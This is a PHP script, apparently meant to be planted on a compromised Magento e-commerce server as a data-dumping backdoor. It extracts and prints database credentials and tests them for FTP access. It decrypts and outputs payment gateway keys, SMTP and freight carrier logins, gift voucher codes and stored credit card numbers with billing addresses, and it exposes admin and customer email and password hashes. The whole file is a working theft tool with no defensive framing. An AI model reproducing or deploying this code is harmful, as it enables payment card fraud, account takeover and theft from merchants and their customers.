<?php
error_reporting(E_ALL);
ini_set('display_errors', TRUE);
ini_set('display_startup_errors', TRUE);

if(file_exists($_SERVER['DOCUMENT_ROOT'].'/app/etc/local.xml')) {
   $xml = simplexml_load_file($_SERVER['DOCUMENT_ROOT'].'/app/etc/local.xml');
   if(isset($xml->global->resources->default_setup->connection)) {
       $connection = $xml->global->resources->default_setup->connection;
       $prefix = $xml->global->resources->db->table_prefix;
       //echo $connection->host."|".$connection->username."|".$connection->password."|".$connection->dbname."<br/>\n";
       require_once $_SERVER['DOCUMENT_ROOT'].'/app/Mage.php';
       
       try {
           $app = Mage::app('default');
           Mage::getSingleton('core/session', array('name'=>'frontend'));
       }catch(Exception $e) {
        $message = $e->getMessage();
        if(!empty($message)) {
          echo '<b>Message:</b> ' .$e->getMessage()."<br>";
        }
      }

       if (!mysql_connect($connection->host, $connection->username, $connection->password)){
           print("Could not connect: " . mysql_error());
       }
       mysql_select_db($connection->dbname);
       echo "<b>DATABASE:</b> ".$connection->host."|".$connection->username."|".$connection->password."|".$connection->dbname."<br>";
	   echo "<b>FTP:</b> ";
		$ftpsite     = $_SERVER['SERVER_NAME'];
		$ftphostx    = str_replace("www.", "", $ftpsite);
		$ftphost     = "ftp.".$ftphostx;
		$ftpuser     = $connection->username;
		$ftppassword = $connection->password;

		$ftpConn = ftp_connect($host);
		$ftplogin = ftp_login($ftpConn,$ftpuser,$ftppassword);
		if ((!$ftpConn) || (!$ftplogin)) {
		 echo 'Failed<br>';
		} else {
		 echo 'Success<br>';
		}
		ftp_close($ftpConn);
    echo "<b>AUTHORIZENET:</b> <br>";
       $result = mysql_query("SELECT value FROM `".$prefix."core_config_data` where path = 'payment/authorizenet/login'");
       if($result !== FALSE) {
           while($row = mysql_fetch_array($result, MYSQL_ASSOC)) {
            $show_data = Mage::helper('core')->decrypt($row["value"]);
            if(!empty($show_data)) {
              echo $show_data."|";
            }
           }
           mysql_free_result($result);
       }
       $result = mysql_query("SELECT value FROM `".$prefix."core_config_data` where path = 'payment/authorizenet/trans_key'");
       if($result !== FALSE) {
           while($row = mysql_fetch_array($result, MYSQL_ASSOC)) {
            $show_data = Mage::helper('core')->decrypt($row["value"]);
            if(!empty($show_data)) {
                echo $show_data."<br>";
            }
           }
           mysql_free_result($result);
       }
	   
	   //SMTP
       echo "<b>SMTP:</b> <br>";
       $result = mysql_query("SELECT value FROM `".$prefix."core_config_data` where path = 'smtppro/general/smtp_username'");
       if($result !== FALSE) {
           while($row = mysql_fetch_array($result, MYSQL_ASSOC)) {
               echo Mage::helper('core')->decrypt($row["value"])."|";
           }
           mysql_free_result($result);
       }
       $result = mysql_query("SELECT value FROM `".$prefix."core_config_data` where path = 'smtppro/general/smtp_password'");
       if($result !== FALSE) {
           while($row = mysql_fetch_array($result, MYSQL_ASSOC)) {
               echo Mage::helper('core')->decrypt($row["value"])."|";
           }
           mysql_free_result($result);
       }
       $result = mysql_query("SELECT value FROM `".$prefix."core_config_data` where path = 'smtppro/general/smtp_host'");
       if($result !== FALSE) {
           while($row = mysql_fetch_array($result, MYSQL_ASSOC)) {
               echo Mage::helper('core')->decrypt($row["value"])."|";
           }
           mysql_free_result($result);
       }
       $result = mysql_query("SELECT value FROM `".$prefix."core_config_data` where path = 'smtppro/general/smtp_port'");
       if($result !== FALSE) {
           while($row = mysql_fetch_array($result, MYSQL_ASSOC)) {
               echo Mage::helper('core')->decrypt($row["value"])."|";
           }
           mysql_free_result($result);
       }
       $result = mysql_query("SELECT value FROM `".$prefix."core_config_data` where path = 'smtppro/general/smtp_ssl'");
       if($result !== FALSE) {
           while($row = mysql_fetch_array($result, MYSQL_ASSOC)) {
               echo Mage::helper('core')->decrypt($row["value"])."<br>";
           }
           mysql_free_result($result);
       }

       echo "<b>CARRIER OLDDOMAIN:</b> <br>";
       $result = mysql_query("SELECT value FROM `".$prefix."core_config_data` where path = 'carriers/olddominion/account'");
       if($result !== FALSE) {
           while($row = mysql_fetch_array($result, MYSQL_ASSOC)) {
               echo Mage::helper('core')->decrypt($row["value"])."|";
           }
           mysql_free_result($result);
       }
       $result = mysql_query("SELECT value FROM `".$prefix."core_config_data` where path = 'carriers/olddominion/password'");
       if($result !== FALSE) {
           while($row = mysql_fetch_array($result, MYSQL_ASSOC)) {
               echo Mage::helper('core')->decrypt($row["value"])."|";
           }
           mysql_free_result($result);
       }
       $result = mysql_query("SELECT value FROM `".$prefix."core_config_data` where path = 'carriers/olddominion/username'");
       if($result !== FALSE) {
           while($row = mysql_fetch_array($result, MYSQL_ASSOC)) {
               echo Mage::helper('core')->decrypt($row["value"])."<br>";
           }
           mysql_free_result($result);
       }

       echo "<b>CARRIER ESTES: </b><br>";
       $result = mysql_query("SELECT value FROM `".$prefix."core_config_data` where path = 'carriers/estes/username'");
       if($result !== FALSE) {
           while($row = mysql_fetch_array($result, MYSQL_ASSOC)) {
               echo Mage::helper('core')->decrypt($row["value"])."|";
           }
           mysql_free_result($result);
       }
       $result = mysql_query("SELECT value FROM `".$prefix."core_config_data` where path = 'carriers/estes/password'");
       if($result !== FALSE) {
           while($row = mysql_fetch_array($result, MYSQL_ASSOC)) {
               echo Mage::helper('core')->decrypt($row["value"])."|";
           }
           mysql_free_result($result);
       }
       $result = mysql_query("SELECT value FROM `".$prefix."core_config_data` where path = 'carriers/estes/account'");
       if($result !== FALSE) {
           while($row = mysql_fetch_array($result, MYSQL_ASSOC)) {
               echo Mage::helper('core')->decrypt($row["value"])."<br>";
           }
           mysql_free_result($result);
       }

       //vouchers
       echo "<b>VOUCHERS:</b> <br>";
       $result = mysql_query("SELECT gift_code,balance FROM ".$prefix."giftvoucher");
       if($result !== FALSE) {
           while($row = mysql_fetch_array($result, MYSQL_ASSOC)) {
				   echo ''.$row['gift_code']."|".$row['balance']."<br/>\n";
           }
           mysql_free_result($result);
       }

       //Check if existed saved cc
       $result = mysql_query("SELECT count(*) FROM ".$prefix."sales_flat_quote_payment ");
       if($result !== FALSE) {
           $count = mysql_fetch_array($result, MYSQL_NUM);
           mysql_free_result($result);
           echo "<b>CC QUOTE PAYMENT (".strval($count[0])."):</b> <a href=?view=ccquote>VIEW</a><br>";
           if($count && $count[0]){
               $result = mysql_query("SELECT sfo.updated_at, sfo.cc_owner,sfo.cc_number_enc,CONCAT(sfo.cc_exp_month,'|',sfo.cc_exp_year) as exp,CONCAT(billing.firstname,'|',billing.lastname,'|',billing.street,'|',billing.city,'|', billing.region,'|',billing.postcode,'|',billing.country_id,'|',billing.telephone,'|',billing.email) AS 'Billing Address' FROM ".$prefix."sales_flat_quote_payment AS sfo JOIN ".$prefix."sales_flat_quote_address AS billing ON billing.quote_id = sfo.quote_id AND billing.address_type = 'billing'");
               if($result === FALSE) {
                   print("<b>Error sql:</b>".mysql_error()."<br>"); // TODO: better error handling
               }
               while($row = mysql_fetch_array($result, MYSQL_ASSOC)) {
                   if(!empty($row['Billing Address'])) {
					if($_GET['view'] == "ccquote") {
						echo ''.$row['updated_at'].'|'.$row['cc_owner'].'|'.$row['Billing Address']."<br>";
						}
				   }
               }
               mysql_free_result($result);
           }
       }
       $result = mysql_query("SELECT count(*) FROM `".$prefix."sales_flat_order_payment` where cc_number_enc !=''");
       if($result !== FALSE) {
           $count = mysql_fetch_array($result, MYSQL_NUM);
           mysql_free_result($result);
           echo "<b>CC ORDER PAYMENT (".strval($count[0])."):</b> <a href=?view=ccorder>VIEW</a><br/>\n";
           if($count && $count[0]){
               $result = mysql_query("SELECT sfo.cc_owner,sfo.cc_number_enc,CONCAT(sfo.cc_exp_month,'|',sfo.cc_exp_year) as exp,CONCAT(billing.firstname,'|',billing.lastname,'|',billing.street,'|',billing.city,'|', billing.region,'|',billing.postcode,'|',billing.country_id,'|',billing.telephone,'|',billing.email) AS 'Billing Address' FROM ".$prefix."sales_flat_order_payment AS sfo JOIN ".$prefix."sales_flat_order_address AS billing ON billing.parent_id = sfo.parent_id AND billing.address_type = 'billing' where cc_number_enc != ''");
               if(!$result) {
                   print("<b>Error sql:</b>".mysql_error()."<br/>\n"); // TODO: better error handling
               }
               while($row = mysql_fetch_array($result, MYSQL_ASSOC)) {
				   if($_GET['view'] == "ccorder") {
                   echo ''.$row['cc_owner'].'|'.Mage::helper('core')->decrypt($row['cc_number_enc']).'|'.$row['exp'].'|'.$row['Billing Address']."<br/>\n";
				   }
			   }
               mysql_free_result($result);
           }
       }
       $result = mysql_query("SELECT user_id,firstname,lastname,email,username,password FROM `".$prefix."admin_user` where is_active = '1'");
       if($result !== FALSE) {
           echo "<b>ADMIN:</b> <a href=?view=admin>VIEW</a><br>";
           while($row = mysql_fetch_array($result, MYSQL_ASSOC)) {
			   if($_GET['view'] == "admin") {
               echo $row["user_id"]."|".$row["username"]."|".$row["password"]."|".$row["email"]."|".$row["firstname"]."|".$row["lastname"]."<br/>\n";
			   }
			}
           mysql_free_result($result);
       }
       //export username, password
       $result = mysql_query("SELECT email,value FROM ".$prefix."customer_entity_varchar, ".$prefix."customer_entity WHERE ".$prefix."customer_entity_varchar.entity_id = ".$prefix."customer_entity.entity_id and attribute_id=12");
       if($result !== FALSE) {
           echo "<b>EMAIL & PASSWORD:</b> <a href=?view=mailpwd>VIEW</a><br>";
           echo "<b>EMAIL:</b> <a href=?view=mail>VIEW</a><br>";
           while($row = mysql_fetch_array($result, MYSQL_ASSOC)) {
			   if($_GET['view'] == "mailpwd") {
				  echo ''.$row['email']."|".$row['value']."<br/>\n"; 
			   } elseif($_GET['view'] == "mail") {
				  echo ''.$row['email']."<br/>\n"; 
			   }
           }
           mysql_free_result($result);
       }
   }
   
} else {
   print('Unable to load Magento local.xml');
}
//unlink(__FILE__);
?>
